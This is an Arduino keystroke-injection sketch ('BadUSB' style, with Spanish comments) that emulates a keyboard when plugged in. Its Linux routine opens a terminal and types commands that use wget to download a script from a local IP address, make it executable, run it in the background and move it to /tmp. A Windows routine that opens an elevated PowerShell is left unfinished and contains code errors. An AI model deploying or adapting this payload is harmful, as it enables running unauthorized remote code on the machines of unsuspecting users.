#include <Keyboard.h>


//METHODS
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

//SO

//--linux

String addr="192.168.1.168";
String file="nex.sh";

void instruction(String action){
  int timeToWait = 100;
  Keyboard.print(action);
  typeKey(KEY_RETURN);
  delay(timeToWait);
}

void linuxSO(){
  //Abrir terminal en linux ( Estudiar que tipo de arquitectura tiene)
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('t');
  Keyboard.releaseAll();
  delay(500);

  //INTRUCCIONES A REALIZAR
  String secuence="";
  secuence =  String("wget " + addr + "/" + file);
  instruction(secuence);
  secuence = String ("chmod +x " + file);
  instruction(secuence);
  secuence = String ("./" + file + " &");
  instruction(secuence);
  secuence = String ("mv " + file + " /tmp/" + file);
  instruction(secuence);
  instruction("exit");
}

//--windows

void windowsSO(){
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press("r");
  Keyboard.releaseAll();

  delay(200);
  
  String secuence="";
  secuence = "powershell Start-Process powershell -Verb runAs";
  instruction =(secuence);

  //COMPLETAR CON POWERSHELL
 
}

void setup()
{

  Keyboard.begin();
  delay(1000);

  linuxSO();
  
  Keyboard.end();
}

void loop() {}
